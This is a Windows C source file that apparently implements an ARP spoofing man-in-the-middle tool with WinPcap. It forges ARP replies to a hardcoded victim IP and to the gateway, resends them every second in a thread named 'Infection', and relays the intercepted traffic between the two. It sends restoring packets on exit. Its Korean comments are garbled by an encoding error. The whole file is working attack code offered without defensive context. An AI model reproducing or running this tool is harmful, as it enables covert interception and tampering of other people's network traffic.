#include "pcap.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <winsock2.h>
#include <iphlpapi.h>
#include <Iptypes.h>
#include <windows.h>
#pragma comment(lib, "Iphlpapi.lib")
#pragma comment (lib, "wpcap.lib")
#pragma comment (lib, "ws2_32.lib" )
#define RIGHT_SHIFT(value, bytes) ((value) >> ((bytes) << 3))
#define GET_HEX(value)    ((value) & 0xFF)
struct pcap_pkthdr header;
u_char vipacket[100], gipacket[100];
pcap_t *pickedDev;
HANDLE hThread1, hThread2;
PIP_ADAPTER_INFO pAdapterInfo, pAdapter;
ULONG buflen;
IPAddr DestIp = 0, SrcIp = 0, GateIp = 0;
u_char MyMac[6], VicMac[6], GateMac[6];
u_char Vip[4], Sip[4], Gip[4];
int che = 1;
void packetche(const u_char *repacket, int len)
{
	int i, vcou = 0, gcou = 0;
	u_char cp[2000] = { 0 };
	for (i = 0; i < len; i++)
		cp[i] = repacket[i];
	for (i = 0; i < 6; i++)
	{
		if (cp[i + 6] == VicMac[i] && cp[i] == MyMac[i])
			vcou++;
		if (cp[i + 6] == GateMac[i] && cp[i] == MyMac[i])
			gcou++;
	}	//vic��ǻ�ͷ� ���� ��Ŷ���� Gateway�� ���� ��Ŷ���� �����ϱ� ���� for
	if (vcou == 6)
	{
		for (i = 0; i < 6; i++)
		{
			cp[i] = GateMac[i];
			cp[i + 6] = MyMac[i];
		}
		if (cp[12] == 0x08 && cp[13] == 0x06)
		{
			for (i = 22; i < 28; i++)
			{
				cp[i] = MyMac[i - 22];
				cp[i + 10] = GateMac[i - 22];
			}
		}//ARP ��Ŷ�� ��� ARP ��� �κ��� Mac ��巹���� ����
		pcap_sendpacket(pickedDev, cp, len);
	}	//vic��ǻ�ͷ� ���� ���϶� ���� ��Ŷ�� �����Ͽ� ����
	if (gcou == 6)
	{
		for (i = 0; i < 6; i++)
		{
			cp[i] = VicMac[i];
			cp[i + 6] = MyMac[i];
		}
		if (cp[12] == 0x08 && cp[13] == 0x06)
		{
			for (i = 22; i < 28; i++)
			{
				cp[i] = MyMac[i - 22];
				cp[i + 10] = VicMac[i - 22];
			}
		}//ARP ��Ŷ�� ��� ARP ��� �κ��� Mac ��巹���� ����
		pcap_sendpacket(pickedDev, cp, len);
	}//Gateway�� ���� ���϶� ���� ��Ŷ�� �����Ͽ� ����
}
DWORD WINAPI con(LPVOID arg)
{
	int scan = 1;
	while (scan)
		scanf("%d", &scan);
	che = 0;
	return 0;
}
DWORD WINAPI Infection(LPVOID arg)
{
	while (1)
	{
		pcap_sendpacket(pickedDev, gipacket, sizeof(gipacket));
		pcap_sendpacket(pickedDev, vipacket, sizeof(vipacket));
		Sleep(1000);
	}
	return 0;
}
int main(int argc, char *argv[])
{
	const u_char *repacket;
	pcap_if_t *allDevice, *device;
	char errorMSG[256];
	int i, j = 0;
	ULONG PhysAddrLen = 6;
	pAdapterInfo = (IP_ADAPTER_INFO *)malloc(sizeof(IP_ADAPTER_INFO));
	buflen = sizeof(IP_ADAPTER_INFO);
	if (GetAdaptersInfo(pAdapterInfo, &buflen) == ERROR_BUFFER_OVERFLOW)
	{
		free(pAdapterInfo);
		pAdapterInfo = (IP_ADAPTER_INFO *)malloc(buflen);
	}
	if (GetAdaptersInfo(pAdapterInfo, &buflen) == NO_ERROR)
		pAdapter = pAdapterInfo;
	argv[1] = "192.168.0.6";
	DestIp = inet_addr(argv[1]);
	SrcIp = inet_addr(pAdapter->IpAddressList.IpAddress.String);
	GateIp = inet_addr(pAdapter->GatewayList.IpAddress.String);		//IP ��������
	SendARP(SrcIp, SrcIp, MyMac, &PhysAddrLen);
	SendARP(DestIp, SrcIp, VicMac, &PhysAddrLen);
	SendARP(GateIp, SrcIp, GateMac, &PhysAddrLen);		//Mac ��巹�� ��������
	i = 4;
	while (i--)
		Vip[i] = GET_HEX(RIGHT_SHIFT(DestIp, i));
	i = 4;
	while (i--)
		Sip[i] = GET_HEX(RIGHT_SHIFT(SrcIp, i));
	i = 4;
	while (i--)
		Gip[i] = GET_HEX(RIGHT_SHIFT(GateIp, i));		//IP�� ���� �迭�� �ϳ��� ����
	for (i = 0; i < 6; i++)
	{
		gipacket[i] = GateMac[j];
		vipacket[i] = VicMac[j++];
	}
	j = 0;
	for (; i < 12; i++)
	{
		gipacket[i] = MyMac[j];
		vipacket[i] = MyMac[j++];
	}
	gipacket[12] = vipacket[12] = 0x08;
	gipacket[13] = vipacket[13] = 0x06;
	gipacket[14] = vipacket[14] = 0x00;
	gipacket[15] = vipacket[15] = 0x01;
	gipacket[16] = vipacket[16] = 0x08;
	gipacket[17] = vipacket[17] = 0x00;
	gipacket[18] = vipacket[18] = 0x06;
	gipacket[19] = vipacket[19] = 0x04;
	gipacket[20] = vipacket[20] = 0x00;
	gipacket[21] = vipacket[21] = 0x02;
	for (i = 22; i < 42; i++)
	{
		if (j == 6)
			j = 0;
		if (i < 28)
			gipacket[i] = vipacket[i] = MyMac[j++];
		if (i >= 28 && i < 32)
		{
			gipacket[i] = Vip[j];
			vipacket[i] = Gip[j++];
		}
		if (i >= 32 && i < 38)
		{
			if (i == 32 && j == 4)
				j = 0;
			gipacket[i] = GateMac[j];
			vipacket[i] = VicMac[j++];
		}
		if (i >= 38 && i < 42)
		{
			gipacket[i] = Gip[j];
			vipacket[i] = Vip[j++];
		}
	}				//GateWay�� Vic�� ��ǻ�͸� ������ų ��Ŷ ����
	if ((pcap_findalldevs(&allDevice, errorMSG)) == -1)
		printf("��ġ �˻� ����");
	device = allDevice;
	pickedDev = pcap_open_live(device->name, 65536, 0, 1000, errorMSG);
	pcap_freealldevs(allDevice);	//����̽��� �ҷ���
	hThread1 = CreateThread(NULL, 0, Infection, NULL, 0, NULL);	//������Ŷ�� ������ ������ ����
	hThread2 = CreateThread(NULL, 0, con, NULL, 0, NULL); //�����ų�� ���� �˻��ϴ� ������ ����
	while (che)
	{
		repacket = pcap_next(pickedDev, &header);
		packetche(repacket, header.len);
	}
	CloseHandle(hThread1);
	CloseHandle(hThread2);	//������ ����
	for (i = 0; i < 6; i++)
	{
		gipacket[i + 32] = gipacket[i] = GateMac[i];
		gipacket[i + 22] = gipacket[i + 6] = VicMac[i];
		vipacket[i + 32] = vipacket[i] = VicMac[i];
		vipacket[i + 22] = vipacket[i + 6] = GateMac[i];
	}	//�����Ȱ� ������ų ��Ŷ ����
	pcap_sendpacket(pickedDev, gipacket, sizeof(gipacket));
	pcap_sendpacket(pickedDev, vipacket, sizeof(vipacket));
	return 0;
}